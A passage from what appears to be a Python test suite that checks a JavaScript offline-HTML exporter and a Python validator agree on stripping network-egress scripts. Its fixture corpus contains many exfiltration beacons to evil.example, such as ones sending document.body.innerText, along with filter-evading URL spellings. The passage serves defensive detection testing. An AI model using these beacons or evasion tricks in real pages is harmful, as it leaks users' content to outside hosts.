        # A `//` that does not START the reference is not an authority.
        ("importmap", {}, '{"imports": {"a": "./b//c.js"}}'),
        ("importmap", {}, '{"scopes": {"/inner/": {"lib": "./inner.js"}}}'),
        ("importmap", {}, "{}"),
    ]
    # Type normalization: these are HTML KEYWORD types, not MIME types, so a browser matches them
    # exactly after trimming ASCII whitespace. A parameterized spelling is inert data.
    _ACTIVE_DATA_TYPE_CASES = [
        ("importmap", "importmap"),
        ("  IMPORTMAP\t", "importmap"),
        ("speculationrules", "speculationrules"),
        ("SpeculationRules", "speculationrules"),
        ("importmap;charset=utf-8", ""),
        ("speculationrules; x=1", ""),
        ("module", ""),
        ("application/json", ""),
        ("text/javascript", ""),
        ("", ""),
    ]

    def _runtime_active_data_source(self):
        """The exporter's whole active-data decision, as JS source, for evaluation in node.

        Extracted as one contiguous region rather than re-implemented: the decision is four parts
        (type normalization, the `src` rule, the JSON parse and the recursive walk), and a Python
        re-implementation would keep passing after any of them drifted - which is exactly the drift
        the parity test exists to catch.
        """
        source = self._read("68-export-offline.js")
        start = source.find("const _OFFLINE_ACTIVE_DATA_TYPES = [")
        self.assertNotEqual(start, -1,
                            "the runtime no longer defines _OFFLINE_ACTIVE_DATA_TYPES; the parity "
                            "extraction is stale")
        end = source.find("function _offlineActiveDataBlockIsRemovable(", start)
        self.assertNotEqual(end, -1,
                            "the runtime no longer defines _offlineActiveDataBlockIsRemovable "
                            "after the type list; the parity extraction is stale")
        end = source.find("\n}", end)
        self.assertNotEqual(end, -1, "could not find the end of _offlineActiveDataBlockIsRemovable")
        region = source[start:end + 2]
        for name in ("_offlineActiveDataScriptType", "_OFFLINE_NONLOCAL_REF_RE",
                     "_offlineIsNonLocalRef", "_offlineJsonHasNonLocalRef"):
            self.assertIn(name, region,
                          "%s is no longer inside the extracted active-data region, so the parity "
                          "check would run a partial copy of the decision" % name)
        return region

    def test_the_python_and_js_active_data_block_rules_agree(self):
        """The offline strip (JS) and the strict validator (Python) must treat `speculationrules`
        and `importmap` blocks identically, judged by running the REAL JS.

        Neither type is JavaScript, so the runnable-type predicate never looked at either - yet a
        speculation ruleset makes the browser fetch on its own (a `"source": "document"` one names
        no URL at all, which is why it is removed unconditionally) and an import map re-points
        where a bare module specifier resolves, which the literal `import "https://..."` scan
        structurally cannot see. Two independent copies of the rule are exactly the drift the
        runnable-script-type parity test exists for: a validator that recognized less would bless a
        file the exporter strips, and one that recognized more would reject the file it just
        produced. Both directions are pinned - a removed corpus AND a kept corpus - so the rule can
        neither weaken into "nothing is active" nor widen into "delete every block". The exporter's
        own source is evaluated in node, because compiling it with Python's `re`/`json` could only
        ever prove what PYTHON does with it and structurally cannot catch an engine difference.
        """
        self.assertEqual(
            tuple(re.findall(r'"([^"]+)"',
                             re.search(r"^const _OFFLINE_ACTIVE_DATA_TYPES = \[(.+?)\];$",
                                       self._read("68-export-offline.js"), re.MULTILINE).group(1))),
            tuple(resources.OFFLINE_ACTIVE_DATA_TYPES),
            "the exporter's _OFFLINE_ACTIVE_DATA_TYPES and the validator's "
            "OFFLINE_ACTIVE_DATA_TYPES have diverged - a type only one of them knows about is "
            "either an unstripped active block the gate blesses, or a false rejection")
        for raw, expected in self._ACTIVE_DATA_TYPE_CASES:
            self.assertEqual(resources.offline_active_data_script_type({"type": raw}), expected,
                             "the validator normalizes the script type %r wrongly" % raw)
        for stype, attrs, body in self._ACTIVE_DATA_REMOVED:
            self.assertTrue(resources.offline_active_data_block_is_removable(stype, attrs, body),
                            "the validator no longer rejects %r %r %r" % (stype, attrs, body))
        for stype, attrs, body in self._ACTIVE_DATA_KEPT:
            self.assertFalse(resources.offline_active_data_block_is_removable(stype, attrs, body),
                             "the validator now rejects the local block %r %r %r" % (stype, attrs, body))

        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        payload = {
            "types": [raw for raw, _ in self._ACTIVE_DATA_TYPE_CASES],
            "removed": [[t, sorted(a), b] for t, a, b in self._ACTIVE_DATA_REMOVED],
            "kept": [[t, sorted(a), b] for t, a, b in self._ACTIVE_DATA_KEPT],
        }
        script = (
            self._runtime_active_data_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "const el=(attrs,body)=>({hasAttribute:(n)=>attrs.indexOf(n)!==-1,textContent:body});"
            "const decide=([t,attrs,body])=>{const k=_offlineActiveDataScriptType(t);"
            "return k?_offlineActiveDataBlockIsRemovable(k,el(attrs,body)):null;};"
            "process.stdout.write(JSON.stringify({"
            "types:p.types.map(_offlineActiveDataScriptType),"
            "removed:p.removed.map(decide),kept:p.kept.map(decide)}));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the active-data decision: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        # Length-check before zipping: `zip` truncates silently, so a short list would let this
        # pass having asserted nothing.
        for key, corpus in (("types", self._ACTIVE_DATA_TYPE_CASES),
                            ("removed", self._ACTIVE_DATA_REMOVED),
                            ("kept", self._ACTIVE_DATA_KEPT)):
            self.assertEqual(len(verdicts.get(key, [])), len(corpus),
                             "node returned %d %s verdicts for %d samples"
                             % (len(verdicts.get(key, [])), key, len(corpus)))
        for (raw, expected), got in zip(self._ACTIVE_DATA_TYPE_CASES, verdicts["types"]):
            self.assertEqual(got, expected,
                             "the REAL JS engine normalizes the script type %r to %r, and the "
                             "validator to %r" % (raw, got, expected))
        for sample, hit in zip(self._ACTIVE_DATA_REMOVED, verdicts["removed"]):
            self.assertTrue(hit, "the REAL JS engine no longer removes %r, so the exporter ships a "
                                 "block the Python validator rejects" % (sample,))
        for sample, hit in zip(self._ACTIVE_DATA_KEPT, verdicts["kept"]):
            self.assertFalse(hit, "the REAL JS engine now deletes the local block %r" % (sample,))

    _NAV_CORPUS_NAVIGATES = [
        'location.href = "https://evil.example/steal?d=" + document.body.innerText;',
        "\nlocation = 'https://evil.example';",
        'window.location.href="//evil.example/beacon";',
        "top.location.replace('https://evil.example')",
        'document.location.assign("https://evil.example")',
        "self.location.href = `https://evil.example`",
        'parent.location.href = "http://evil.example"',
        'globalThis.location.href =\n  "https://evil.example"',
        'window.location = "https://evil.example"',
        'window.open( "//evil.example/popup" )',
        'self.open("https://evil.example")',
        'LOCATION.HREF = "HTTPS://EVIL.EXAMPLE"',
        # A prefix CHAIN, not just one prefix - `window.` in front used to clear the strip.
        'window.top.location.href = "https://evil.example"',
        'window.parent.location.href = "https://evil.example"',
        'self.top.location = "https://evil.example"',
        # Optional chaining, in forms that are VALID JavaScript. (An optional-chain ASSIGNMENT
        # such as `window?.location.href = <url>` is a SyntaxError and navigates nothing, so
        # pinning it would only prove the regex matches dead source.)
        'window?.open("https://evil.example")',
        'location?.assign("https://evil.example")',
        'window.location?.assign("https://evil.example")',
        'window ?. open ( "https://evil.example" )',
        # `frames` (=== window) is a real top-level navigation.
        'frames.location.href = "https://evil.example"',
        # The natural arrow-function beacon, and a bare assignment inside a block.
        'setTimeout(() => location = "https://evil.example/?" + document.body.innerText)',
        'if (x) {\n  location = "https://evil.example";\n}',
        'if (x) location = "https://evil.example";',
        # Shadowing does NOT rescue a PREFIXED sink: `window.location` names the real one no matter
        # what a local `location` shadows, so these must still be stripped.
        'const location = {}; window.location.href = "https://evil.example";',
        'const location = {}; top.location.replace("https://evil.example");',
        'const location = {}; window.open("https://evil.example");',
        # A name that merely CONTAINS `location` declares no binding at all, so an unprefixed sink
        # beside it still navigates the real document. The shadow rule reads raw source, so it has
        # to insist on a boundary at BOTH ends of the name and of the keyword: without the leading
        # one, an ordinary `newLocation` parameter or `currentLocation` destructuring bought the
        # whole script the shadowed treatment; without a boundary after the keyword, the optional
        # function-name slot absorbed the tail of a longer word. Either one let this beacon past
        # with a one-token rename.
        'function updateLocation(newLocation) { location.href = "https://evil.example"; }',
        'var { currentLocation } = opts; location.href = "https://evil.example";',
        'functionx(location); location.href = "https://evil.example";',
        # JS treats U+FEFF as whitespace; Python's `\\s` does not, so a shared class let this
        # valid-JS beacon be stripped by the exporter yet certified clean by the validator.
        'location.href =\ufeff"https://evil.example"',
        # A SCHEME-ONLY URL literal - no slashes after the scheme. A browser resolves
        # `https:evil.example/x` to `https://evil.example/x`, so this beacons exactly as well as
        # the shapes above while needing no aliasing, no computed access and no runtime assembly.
        'location.href = "https:evil.example/steal?d=" + document.body.innerText;',
        "\nlocation = 'https:evil.example';",
        'window.location.href = "https:evil.example"',
        'top.location.replace("https:evil.example")',
        'document.location.assign(`http:evil.example`)',
        'window.open("https:evil.example/popup")',
        'const location = {}; window.location.href = "https:evil.example";',
        # A URL literal the BROWSER NORMALIZES before it resolves it. Every one of these is spelled
        # with characters that are LITERALLY in the source - no string escape, no aliasing, no
        # runtime assembly - so a raw scan can see them, and each resolves to the same network host
        # the plain spelling would.
        # (a) Leading C0-or-space padding, which the URL parser strips before it parses anything.
        'location.href = " https://evil.example/steal";',
        "window.location.href = '\u0001https://evil.example'",
        'top.location.replace("  https:evil.example")',
        # (b) ASCII tab / LF / CR, which the URL parser removes from ANYWHERE in the input. A real
        # tab is legal inside an ordinary string literal and a real newline inside a template one,
        # so splitting the scheme costs an attacker one keystroke.
        'location.href = "ht\ttps://evil.example"',
        'window.open("ht\ttps://evil.example/popup")',
        'document.location.assign(`ht\ntps://evil.example`)',
        'location.href = "/\t/evil.example"',
        # (c) A backslash where a slash is expected: for a special scheme the URL parser treats the
        # two alike, so either authority slash can be written as a slash, an escaped slash, or an
        # escaped backslash.
        r'location.href = "\\\\evil.example"',
        r'window.location = "\//evil.example"',
        r'top.location.replace("/\\evil.example")',
        # (d) A JavaScript LineContinuation - a backslash followed by a line terminator - evaluates
        # to NOTHING, so it pads the literal or splits the scheme without the URL parser having to
        # remove anything. It is fully visible in raw source and needs no decoder, unlike the
        # character escapes the CMH-OFFLINE-05 residual keeps.
        'location.href = "\\\nhttps://evil.example/steal";',
        'window.location.href = "ht\\\rtps://evil.example"',
        'top.location.replace(`\\\u2028https:evil.example`)',
        'location.href = "/\\\n/evil.example"',
        # (e) A backslash before a character that starts no escape sequence is a
        # NonEscapeCharacter: it evaluates to that character, so a single backslash anywhere in the
        # scheme (or before the padding) is erased by the JS parser and the URL is unchanged. That
        # is one keystroke and needs no decoder, so it is closed rather than left residual.
        'location.href = "\\https://evil.example/steal";',
        'window.location.href = "htt\\ps://evil.example"',
        'top.location.replace("https\\://evil.example")',
        'document.location.assign("\\ https://evil.example")',
        'location.href = "\\htt\\ps\\://evil.example"',
    ]
    # Benign shapes that must SURVIVE. The strip deletes a whole script, so a false positive
    # silently breaks an author's document - the costlier direction of the two.
    _NAV_CORPUS_BENIGN = [
        # Comparisons, not assignments - a document that merely INSPECTS its own URL.
        'if (location.href === "https://evil.example") return;',
        'if (location.href !== "https://evil.example") return;',
        # A network literal and a navigation object in the same script, never joined.
        'var DOCS = "https://docs.example.org/guide"; if (location.hash) document.title = DOCS;',
        # A LOCAL binding that merely happens to be called `location` (a config value, a geocode
        # result). Assigning a URL to it navigates nothing.
        'var location = "https://api.example.com/v1";',
        'const location = "https://docs.example.org/x";',
        'let location = "https://docs.example.org/x";',
        'function f() { var location = "https://evil.example"; return location; }',
        # A local helper called `open` - `open("...")` alone is not the global navigation sink.
        'open("https://docs.example.org/guide")',
        'const open = mk(); open("https://docs.example.org/guide")',
        'xhr.open("GET", "https://evil.example")',
        'myopen("https://evil.example")',
        # Purely LOCAL bindings that merely default to a URL. These navigate nothing, and deleting
        # the whole script over them is the costlier failure direction.
        'function f(location = "https://cdn.example.com/x") { return location; }',
        'const { location = "https://cdn.example.com/x" } = opts;',
        'var a = 1, location = "https://cdn.example.com/x";',
        # Not the top-level document: some other object's `location` (frame-src 'none' blocks
        # frames anyway).
        'frame.location.href = "https://evil.example"',
        'cfg.location.href = "https://evil.example"',
        # A local binding whose name only case-FOLDS to `location` under Python's Unicode rules
        # (the dotless i). JS `/i` does not fold it, so without `re.ASCII` the validator rejected
        # source the exporter preserves. Keeping it in the BENIGN list pins both engines.
        'locat\u0131on.href = "https://evil.example"',
        '\u017felf.location.href = "https://evil.example"',
        # A LOCAL binding named `location` makes an unprefixed sink refer to that object, not the
        # document - `const location = { href: "" }; location.href = <url>` navigates nothing, so
        # deleting the whole script over it is content loss. Shadow-awareness suppresses only the
        # UNPREFIXED sinks; the prefixed cases below still fire.
        'const location = { href: "" }; location.href = "https://api.example";',
        'let location = {}; location.assign("https://api.example");',
        'function f(location) { location.href = "https://api.example"; }',
        # The ANONYMOUS spellings, which are the branch where the optional function-name group is
        # SKIPPED rather than taken. Every other `function` sample here is named, so without these
        # the zero-identifier path of the CURRENT pattern is unpinned and dropping that group's `?`
        # is a green mutant that deletes an author's script. (The pattern this replaced spelled the
        # same branch as `{0,100}`, so these were already benign then - what they pin is the
        # restructuring, not a fixed bug.)
        'function (location) { location.href = "https://api.example"; }',
        'function(location) { location.href = "https://api.example"; }',
        'const { location } = opts; location.href = "https://api.example";',
        # A binding that is NOT the first thing in the window, so the leading boundary has to be
        # found rather than assumed. Every other sample here puts `location` straight after the
        # `(` or `{`, where the opener itself is the boundary, so these are what would catch a
        # narrowing that rejects a later parameter or a renamed-TO `location`.
        'function f(a, location) { location.href = "https://api.example"; }',
        'const {href: location} = opts; location.href = "https://api.example";',
        'try { x(); } catch (location) { location.href = "https://api.example"; }',
        # A relative navigation inside the offline file is not egress.
        'location.href = "#section-2";',
        'location.assign("./other.html")',
        # The false-positive controls for the SCHEME-ONLY widening. A `https:`/`http:` literal is
        # not a navigation just because it sits near one: a comparison, a plain scheme string, and
        # a shadowed sink must all still survive.
        'if (location.href === "https:api.example.org/v1") return;',
        'var SECURE = "https:"; if (location.protocol === SECURE) document.title = "s";',
        'const location = { href: "" }; location.href = "https:api.example";',
        # A relative path that merely CONTAINS a colon is not a scheme.
        'location.href = "./a:b.html"',
        # The false-positive controls for the NORMALIZED-URL widening. A match DELETES the whole
        # script, so padding, a tab or a backslash next to a URL must not be enough on its own.
        'var TIP = "  https://docs.example.org/x"; if (location.hash) document.title = TIP;',
        'location.href = " #section-2";',
        'location.href = "\tabout.html"',
        'location.assign("\t./other.html")',
        r'location.href = "\n"',
        r'location.href = "\\d+"',
        'if (location.href === " https://evil.example") return;',
        'const location = { href: "" }; location.href = " https://api.example";',
        # A NUL is NOT padding a browser strips: the HTML parser replaces a U+0000 in script data
        # with U+FFFD (verified in chromium), which the URL parser leaves in place, so neither of
        # these navigates - and matching them would make this validator, which reads the RAW text,
        # reject a document the exporter (which reads the parsed text) preserves.
        'location.href = "\u0000https://evil.example"',
        'location.href = "\ufffdhttps://evil.example"',
        # Backslash PARITY is what decides local from network, and it is invisible to every other
        # test: a JS string literal spends TWO source backslashes per runtime backslash, so three
        # source backslashes leave ONE runtime backslash (a local path) where four leave two (an
        # authority). A refactor to a naive `[\\/]{2}` would match this and delete the script.
        r'location.href = "\\\evil.example"',
        'location.href = "  /local/path.html"',
        # An EVEN run of backslashes before the scheme is a real backslash at runtime, which a
        # browser resolves as a local path - the escaping-backslash tolerance must not swallow it.
        r'location.href = "\\https://evil.example"',
    ]

    # The regex literals and name lists the exporter's navigation SCAN is built from, each paired
    # with the validator constant that must mirror it byte for byte, and with the JS flags it must
    # carry. The scan replaced a single repeated-prefix pattern (see `_offlineNavSinkIndex`), so
    # what is SHARED is now the anchor, the three anchored tails and the character classes; the
    # walk that joins them is pinned by running the exporter's own source in node, below.
    _NAV_PATTERN_NAMES = (
        ("_OFFLINE_NAV_ANCHOR_RE", "OFFLINE_NAV_ANCHOR_RE", "gi"),
        ("_OFFLINE_NAV_PROP_TAIL_RE", "OFFLINE_NAV_PROP_TAIL_RE", "iy"),
        ("_OFFLINE_NAV_ASSIGN_TAIL_RE", "OFFLINE_NAV_ASSIGN_TAIL_RE", "iy"),
        ("_OFFLINE_NAV_OPEN_TAIL_RE", "OFFLINE_NAV_OPEN_TAIL_RE", "iy"),
        ("_OFFLINE_NAV_WS_RE", "OFFLINE_NAV_WS_RE", ""),
        ("_OFFLINE_NAV_IDENT_RE", "OFFLINE_NAV_IDENT_RE", ""),
        ("_OFFLINE_NAV_STATEMENT_RE", "OFFLINE_NAV_STATEMENT_RE", ""),
        ("_OFFLINE_NAV_LINE_BREAK_RE", "OFFLINE_NAV_LINE_BREAK_RE", ""),
        ("_OFFLINE_LOCAL_LOCATION_RE", "OFFLINE_LOCAL_LOCATION_RE", "i"),
    )

    def _runtime_nav_pattern(self, name, flags=None):
        """One of the navigation scan's regex SOURCES, extracted from the runtime partial."""
        source = self._read("68-export-offline.js")
        m = re.search(r"^const %s = /(.+)/([a-z]*);$" % re.escape(name), source, re.MULTILINE)
        self.assertIsNotNone(
            m, "the runtime no longer defines %s as a single-line regex literal; the parity "
               "extraction is stale" % name)
        if flags is not None:
            self.assertEqual(
                m.group(2), flags,
                "the runtime's %s carries the flags /%s rather than /%s. A tail that loses its "
                "sticky `y` would SEARCH forward from the anchor instead of matching AT it, which "
                "both widens the shapes it accepts and reopens the quadratic scan this replaced."
                % (name, m.group(2), flags))
        return m.group(1)

    def _runtime_nav_source(self):
        """The exporter's whole navigation decision, as JS source, for evaluation in node.

        Extracted as one contiguous region rather than re-implemented in Python: the decision is
        now a SCAN (anchor pass, three anchored tails, the backwards prefix-chain walk and the
        statement-start rule, plus the local-binding shadow rule), and a Python re-implementation
        would keep passing after any of those drifted - which is exactly the drift this test
        exists to catch.
        """
        source = self._read("68-export-offline.js")
        start = source.find("const _OFFLINE_NAV_ANCHOR_RE = ")
        self.assertNotEqual(start, -1,
                            "the runtime no longer defines _OFFLINE_NAV_ANCHOR_RE; the parity "
                            "extraction is stale")
        end = source.find("function _offlineScriptNavigatesToNetwork(body) {", start)
        self.assertNotEqual(end, -1,
                            "the runtime no longer defines _offlineScriptNavigatesToNetwork after "
                            "the navigation constants; the parity extraction is stale")
        end = source.find("\n}", end)
        self.assertNotEqual(end, -1,
                            "could not find the end of _offlineScriptNavigatesToNetwork")
        region = source[start:end + 2]
        for name in ("_offlineNavAsciiLower", "_offlineNavPrefixStart", "_offlineNavChainOk",
                     "_offlineNavStatementStart", "_offlineNavSinkIndex",
                     "_OFFLINE_LOCAL_LOCATION_RE"):
            self.assertIn(name, region,
                          "%s is no longer inside the extracted navigation region, so the parity "
                          "check would run a partial copy of the decision" % name)
        return region

    # The pattern the scan replaced, frozen here as an ORACLE. It is deliberately a copy rather
    # than an import: the point of `test_the_navigation_scan_matches_the_pattern_it_replaced` is
    # that a hand-written scan recognizes exactly what the regex did, and an oracle that moved with
    # the code would assert nothing. Update it only when the recognized SHAPES change on purpose,
    # in the same commit that changes them.
    _LEGACY_NAV_WS = (r"[ \t\n\r\f\v\u00a0\u1680\u2000-\u200a\u2028\u2029\u202f\u205f\u3000"
                      r"\ufeff]")
    _LEGACY_NAV_CHAIN = (r"(?:(?:window|self|top|parent|globalThis|document|frames)" + _LEGACY_NAV_WS
                         + r"*(?:\?" + _LEGACY_NAV_WS + r"*)?\." + _LEGACY_NAV_WS + r"*)")
    # The URL tail moved with #914: it now also accepts the spellings a browser or the JavaScript
    # parser NORMALIZES into a network URL (padding the URL parser strips, a tab/LF/CR inside the
    # scheme or between the slashes, a backslash authority, a LineContinuation, and an escaping
    # backslash before any literal element). The oracle carries the same tail so it keeps testing
    # the SCAN's structure rather than re-testing the widening.
    _LEGACY_NAV_URL = (_LEGACY_NAV_WS + r"""*["'`](?:\\?[\u0001-\u0020]|\\[\u2028\u2029])*"""
                       r"(?:\\?h(?:\\?[\t\n\r]|\\[\u2028\u2029])*"
                       r"\\?t(?:\\?[\t\n\r]|\\[\u2028\u2029])*"
                       r"\\?t(?:\\?[\t\n\r]|\\[\u2028\u2029])*"
                       r"\\?p(?:\\?[\t\n\r]|\\[\u2028\u2029])*"
                       r"(?:\\?s(?:\\?[\t\n\r]|\\[\u2028\u2029])*)?\\?:"
                       r"|(?:\\?\/|\\\\)(?:\\?[\t\n\r]|\\[\u2028\u2029])*(?:\\?\/|\\\\))")
    _LEGACY_NAV_PROP = (r"location" + _LEGACY_NAV_WS + r"*(?:\?" + _LEGACY_NAV_WS + r"*)?\."
                        + _LEGACY_NAV_WS + r"*(?:href" + _LEGACY_NAV_WS + r"*=(?!=)"
                        r"|(?:assign|replace)" + _LEGACY_NAV_WS + r"*\()")
    _LEGACY_NAV_BARE = (r"(?:location" + _LEGACY_NAV_WS + r"*=(?!=)|open" + _LEGACY_NAV_WS + r"*\()")
    _LEGACY_NAV_FULL = re.compile(
        r"(?:(?:^|[^.A-Za-z0-9_$])" + _LEGACY_NAV_CHAIN + r"*" + _LEGACY_NAV_PROP
        + r"|(?:^|[^.A-Za-z0-9_$])" + _LEGACY_NAV_CHAIN + r"+" + _LEGACY_NAV_BARE
        + r"|(?:^|[;})>\n\r\u2028\u2029])" + _LEGACY_NAV_WS + r"*location" + _LEGACY_NAV_WS
        + r"*=(?!=))" + _LEGACY_NAV_URL, re.IGNORECASE | re.ASCII)
    _LEGACY_NAV_PREFIXED = re.compile(
        r"(?:(?:^|[^.A-Za-z0-9_$])" + _LEGACY_NAV_CHAIN + r"+" + _LEGACY_NAV_PROP
        + r"|(?:^|[^.A-Za-z0-9_$])" + _LEGACY_NAV_CHAIN + r"+" + _LEGACY_NAV_BARE + r")"
        + _LEGACY_NAV_URL, re.IGNORECASE | re.ASCII)

    # Fragments crossed into a corpus of sinks and NEAR-sinks: a boundary character, a prefix
    # chain, a sink spelling, an operator and a URL literal. The interesting cells are the ones
    # that only ALMOST match - `cfg.` in front, a chain that ends in whitespace (which is itself a
    # legal boundary, so a shorter chain matches where the longest does not), `windows.` and
    # `locations.href`, `==` rather than `=`, and a relative URL.
    _NAV_CROSS_HEADS = ("", "$", ";", "\n", " ", "x", ".", "cfg.")
    _NAV_CROSS_CHAINS = ("", "window.", "window . ", "globalThis?. ", "top.window.", "windows.",
                         "frames . ? . ", "document.")
    _NAV_CROSS_SINKS = ("location.href", "LOCATION . href", "location?.href", "location.assign",
                        "location", "open", "locations.href", "location.replace")
    _NAV_CROSS_OPS = ("=", " = ", "==", "(", "")
    _NAV_CROSS_URLS = ('"https://x"', "`https:`", '"./a"', '" https://x"')

    def test_the_python_and_js_scripted_navigation_patterns_agree(self):
        """The offline strip (JS) and the strict validator (Python) must recognize the SAME
        scripted top-level navigations.

        Top-level navigation is the one egress channel the offline CSP cannot close (`navigate-to`
        was dropped from CSP Level 3 and ships nowhere; `sandbox` is ignored in a meta-delivered
        policy), so this check is not defense in depth behind a boundary - for that channel it IS
        the check. Two independent copies of it are exactly the drift the runnable-script-type
        parity test above exists for: a validator that recognized less would certify an offline file
        the exporter no longer protects, and one that recognized more would reject the file the
        exporter just produced.

        Every literal the scan is built from is pinned by TEXT equality, not by re-deriving one from
        the other. That is the only pin that survives the engines disagreeing: `\\w` is ASCII-only
        in JS but Unicode-aware in Python, and JS whitespace includes U+FEFF while Python's does
        not, so a pattern that merely LOOKS shared can still behave differently. The WALK around
        those literals cannot be pinned by text at all, so
        `test_the_navigation_pattern_behaves_the_same_in_the_real_js_engine` runs the exporter's own
        source in node over the same corpus.
        """
        for js_name, py_name, flags in self._NAV_PATTERN_NAMES:
            runtime_pattern = self._runtime_nav_pattern(js_name, flags)
            compiled = getattr(resources, py_name)
            self.assertEqual(
                runtime_pattern, compiled.pattern,
                "the exporter's %s literal and the validator's %s pattern text have diverged. They "
                "must be byte-identical (Python reads the JS-only `\\/` escape as a literal `/` "
                "too), because a validator that recognizes less certifies a file the exporter no "
                "longer protects, and one that recognizes more rejects the file the exporter just "
                "produced." % (js_name, py_name))
            # `re.ASCII` is part of the contract, not an implementation detail: without it Python's
            # IGNORECASE folds several non-ASCII letters onto ASCII ones that JS's `/i` does not, so
            # the validator would reject source the exporter preserves.
            self.assertTrue(
                compiled.flags & re.ASCII,
                "the validator's %s must be compiled with re.ASCII, or Python's Unicode "
                "case-folding (dotless i, long s, Kelvin sign) makes it match identifiers the JS "
                "engine - and therefore the exporter - does not" % py_name)
            self.assertEqual(
                bool(compiled.flags & re.IGNORECASE), "i" in flags,
                "the validator's %s and the exporter's %s disagree about case sensitivity"
                % (py_name, js_name))
            # Guard the spelled-out classes: re-introducing a shared shorthand silently
            # reintroduces the cross-engine divergence, and text equality alone would not notice.
            # Every ASCII-vs-Unicode shorthand is banned, not just the two that actually bit.
            for shared in (r"\s", r"\S", r"\w", r"\W", r"\d", r"\D", r"\b", r"\B"):
                self.assertNotIn(
                    shared, runtime_pattern,
                    "%s uses %r, whose meaning DIFFERS between the JS and Python regex engines "
                    "(ASCII vs Unicode `\\w`/`\\d`; U+FEFF is JS whitespace but not Python's). "
                    "Spell the class out in both copies instead." % (js_name, shared))

        # The prefix chain is walked in code now, so its NAME LIST is shared data rather than part
        # of a pattern - a name only one side knows about is a sink the strip drops and the gate
        # blesses, or the reverse.
        names = re.search(r"^const _OFFLINE_NAV_PREFIX_NAMES = \[(.+?)\];$",
                          self._read("68-export-offline.js"), re.MULTILINE)
        self.assertIsNotNone(names,
                             "the runtime no longer defines _OFFLINE_NAV_PREFIX_NAMES as a "
                             "single-line array; the parity extraction is stale")
        self.assertEqual(
            tuple(re.findall(r'"([^"]+)"', names.group(1))),
            tuple(resources.OFFLINE_NAV_PREFIX_NAMES),
            "the exporter's _OFFLINE_NAV_PREFIX_NAMES and the validator's "
            "OFFLINE_NAV_PREFIX_NAMES have diverged")

        for sample in self._NAV_CORPUS_NAVIGATES:
            self.assertTrue(resources.offline_script_navigates_to_network(sample),
                            "the validator no longer rejects %r" % sample)
        for sample in self._NAV_CORPUS_BENIGN:
            self.assertFalse(resources.offline_script_navigates_to_network(sample),
                             "the validator now rejects the benign script %r" % sample)

    def _run_nav_node(self, node, script, payload, what, timeout=180):
        """Evaluate the extracted navigation source in node, failing rather than hanging.

        A timeout is not belt and braces here: the shape these checks exist to catch is a scan that
        grew superlinear, so a regression makes node run for minutes to hours. Without the timeout
        the run would HANG at exactly the moment the guard was meant to fire.
        """
        try:
            proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                                  capture_output=True, text=True, encoding="utf-8",
                                  timeout=timeout)
        except subprocess.TimeoutExpired:
            self.fail("node did not finish %s within %ds - the scan is superlinear again, which is "
                      "exactly what this guard exists to catch" % (what, timeout))
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate %s: %s" % (what, proc.stderr))
        return json.loads(proc.stdout)

    def test_the_navigation_pattern_behaves_the_same_in_the_real_js_engine(self):
        """Byte-identical pattern text is necessary but NOT sufficient - run the scan in node too.

        Compiling the extracted JS literals with Python's `re` (which the text-equality test above
        does) can only ever prove what PYTHON does with them; it structurally cannot catch an engine
        difference, which is exactly the class of bug this check hit. Now that the decision is a
        SCAN, text equality covers even less of it - the anchor pass, the backwards chain walk and
        the statement-start rule are code, not pattern - so the exporter's own source is evaluated
        here. Skipped when node is absent, the way the repo's other node-gated checks degrade - CI
        always has it.
        """
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        payload = {
            "navigates": self._NAV_CORPUS_NAVIGATES,
            "benign": self._NAV_CORPUS_BENIGN,
        }
        script = (
            self._runtime_nav_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "process.stdout.write(JSON.stringify({"
            "navigates:p.navigates.map(_offlineScriptNavigatesToNetwork),"
            "benign:p.benign.map(_offlineScriptNavigatesToNetwork)}));});"
        )
        verdicts = self._run_nav_node(node, script, payload, "the navigation scan")
        # Length-check before zipping: `zip` truncates silently, so a helper that returned a short
        # (or empty) list would let this pass having asserted nothing.
        self.assertEqual(len(verdicts.get("navigates", [])), len(self._NAV_CORPUS_NAVIGATES),
                         "node returned %d verdicts for %d navigating samples"
                         % (len(verdicts.get("navigates", [])), len(self._NAV_CORPUS_NAVIGATES)))
        self.assertEqual(len(verdicts.get("benign", [])), len(self._NAV_CORPUS_BENIGN),
                         "node returned %d verdicts for %d benign samples"
                         % (len(verdicts.get("benign", [])), len(self._NAV_CORPUS_BENIGN)))
        for sample, hit in zip(self._NAV_CORPUS_NAVIGATES, verdicts["navigates"]):
            self.assertTrue(hit, "the REAL JS engine does not strip %r, so the exporter ships a "
                                 "beacon the Python validator rejects" % sample)
            self.assertTrue(resources.offline_script_navigates_to_network(sample),
                            "the validator does not reject %r" % sample)
        for sample, hit in zip(self._NAV_CORPUS_BENIGN, verdicts["benign"]):
            self.assertFalse(hit, "the REAL JS engine deletes the benign script %r" % sample)
            self.assertFalse(resources.offline_script_navigates_to_network(sample),
                             "the validator rejects the benign script %r" % sample)

    def _nav_cross_corpus(self):
        """Every head x chain x sink x operator x URL crossing, plus the awkward hand-written ones.

        Deterministic and generated rather than listed, because the shapes that matter are the
        near-misses at the JOINS - a boundary character, an optional-chaining dot, a chain that
        ends in whitespace - and those are combinations, not samples anybody thinks to write down.

        Keep every crossed fragment SHORT. The oracle these samples are compared against is the
        quadratic pattern itself, so a fragment that expands into a long near-match would resurrect
        the very cost this change removed, in the test rather than in the product.
        """
        corpus = ["".join(parts) for parts in itertools.product(
            self._NAV_CROSS_HEADS, self._NAV_CROSS_CHAINS, self._NAV_CROSS_SINKS,
            self._NAV_CROSS_OPS, self._NAV_CROSS_URLS)]
        corpus.extend([
            # A shorter chain matches where the longest one does not: the whitespace that ends the
            # chain element is itself a legal boundary, so this navigates even though `$` is not.
            '$window . location.href = "https://evil.example"',
            'a\nwindow . window . location.href = "https://evil.example"',
            'window.window.window.window.window.window.location.href = "https://evil.example"',
